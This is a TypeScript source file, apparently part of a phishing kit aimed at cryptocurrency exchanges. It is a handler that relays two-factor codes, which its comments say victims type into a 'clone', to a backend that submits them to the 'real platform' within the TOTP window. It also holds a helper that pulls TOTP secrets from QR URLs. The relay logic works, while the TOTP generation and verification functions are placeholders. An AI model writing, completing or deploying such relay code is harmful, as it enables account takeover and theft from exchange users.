/**
 * CEX 2FA Handler — Real-time 2FA code submission and verification
 * Handles simultaneous 2FA submission to real platform from backend
 */

import EventEmitter from 'events'

interface PendingTwoFaRequest {
  sessionId: string
  exchange: string
  codeWaitStart: number
  timeout: number
  code?: string
  resolved: boolean
  codeReceivedAt?: number
  expired: boolean
}

class TwoFaHandler extends EventEmitter {
  private pendingRequests: Map<string, PendingTwoFaRequest> = new Map()
  private requestTimeout: NodeJS.Timeout | null = null

  constructor() {
    super()
    this.startCleanupInterval()
  }

  /**
   * Register a pending 2FA request waiting for code
   * Called when backend login requires 2FA verification
   */
  registerPendingCode(sessionId: string, exchange: string, timeoutMs = 120000): string {
    const requestId = `2fa-${Date.now()}-${Math.random().toString(36).slice(2)}`

    this.pendingRequests.set(requestId, {
      sessionId,
      exchange,
      codeWaitStart: Date.now(),
      timeout: timeoutMs,
      resolved: false,
      expired: false,
    })

    return requestId
  }

  /**
   * Submit 2FA code for a pending request
   * Called from frontend when user enters code in clone
   */
  async submitCode(requestId: string, code: string): Promise<boolean> {
    const request = this.pendingRequests.get(requestId)
    if (!request) return false
    if (request.resolved) return false

    // Validate code format
    if (!/^\d{4,8}$/.test(code)) return false

    request.code = code
    request.resolved = true

    // Emit event for backend to consume
    this.emit(`code:${requestId}`, code)

    // Auto-cleanup after 5 seconds
    setTimeout(() => this.pendingRequests.delete(requestId), 5000)

    return true
  }

  /**
   * Wait for 2FA code with timeout and expiration check
   * Called by backend after login returns 2FA_REQUIRED
   */
  async waitForCode(
    requestId: string,
    timeoutMs = 120000,
  ): Promise<{ code: string | null; expired: boolean; error?: string }> {
    const request = this.pendingRequests.get(requestId)
    if (!request) return { code: null, expired: false, error: 'Request not found' }

    return new Promise((resolve) => {
      const startTime = Date.now()
      let resolved = false

      const timer = setTimeout(() => {
        if (!resolved) {
          resolved = true
          request.expired = true
          this.pendingRequests.delete(requestId)
          resolve({ code: null, expired: true, error: 'Timeout - no code received within 120 seconds' })
        }
      }, timeoutMs)

      this.once(`code:${requestId}`, (code: string) => {
        if (!resolved) {
          clearTimeout(timer)
          resolved = true

          const elapsedMs = Date.now() - startTime
          request.codeReceivedAt = Date.now()

          // Check if code was submitted too late (near 30s TOTP boundary)
          if (elapsedMs > 28000) {
            request.expired = true
            resolve({
              code: null,
              expired: true,
              error: `Code received too late (${elapsedMs}ms). TOTP may have expired.`,
            })
            return
          }

          // Code is valid
          resolve({ code, expired: false })
        }
      })
    })
  }

  /**
   * Get pending request info
   */
  getRequest(requestId: string): PendingTwoFaRequest | undefined {
    return this.pendingRequests.get(requestId)
  }

  /**
   * Check if request still waiting for code
   */
  isWaitingForCode(requestId: string): boolean {
    const request = this.pendingRequests.get(requestId)
    if (!request) return false
    if (request.resolved) return false
    if (Date.now() - request.codeWaitStart > request.timeout) return false
    return true
  }

  /**
   * Cancel pending request
   */
  cancelRequest(requestId: string): void {
    const request = this.pendingRequests.get(requestId)
    if (request) {
      request.resolved = true
      this.emit(`code:${requestId}`, null)
      this.pendingRequests.delete(requestId)
    }
  }

  /**
   * Cleanup expired requests
   */
  private startCleanupInterval(): void {
    this.requestTimeout = setInterval(() => {
      const now = Date.now()
      for (const [id, request] of this.pendingRequests.entries()) {
        if (now - request.codeWaitStart > request.timeout) {
          this.pendingRequests.delete(id)
        }
      }
    }, 30000) // Cleanup every 30 seconds
  }

  /**
   * Get stats for monitoring
   */
  getStats(): {
    pendingRequests: number
    timedOut: number
  } {
    let timedOut = 0
    const now = Date.now()

    for (const request of this.pendingRequests.values()) {
      if (now - request.codeWaitStart > request.timeout) {
        timedOut++
      }
    }

    return {
      pendingRequests: this.pendingRequests.size,
      timedOut,
    }
  }

  /**
   * Cleanup on shutdown
   */
  shutdown(): void {
    if (this.requestTimeout) {
      clearInterval(this.requestTimeout)
    }
    this.pendingRequests.clear()
    this.removeAllListeners()
  }
}

// Export singleton
export const twoFaHandler = new TwoFaHandler()

/**
 * Format and structure for 2FA code generation
 * For TOTP-based 2FA, generate codes from stored secret
 */
export function generateTotpCode(secret: string): string {
  // TOTP generation would go here
  // For now, placeholder — real implementation needs:
  // - speakeasy or otplib library
  // - 30-second window management
  // - Base32 secret decoding
  return ''
}

/**
 * Verify if TOTP code is valid for secret
 */
export function verifyTotpCode(secret: string, code: string): boolean {
  // Implementation would verify code matches TOTP window
  return code.length === 6 && /^\d+$/.test(code)
}

/**
 * Extract TOTP secret from QR code data
 */
export function extractTotpSecret(qrUrl: string): string | null {
  try {
    const url = new URL(qrUrl)
    const secret = url.searchParams.get('secret')
    return secret
  } catch {
    return null
  }
}
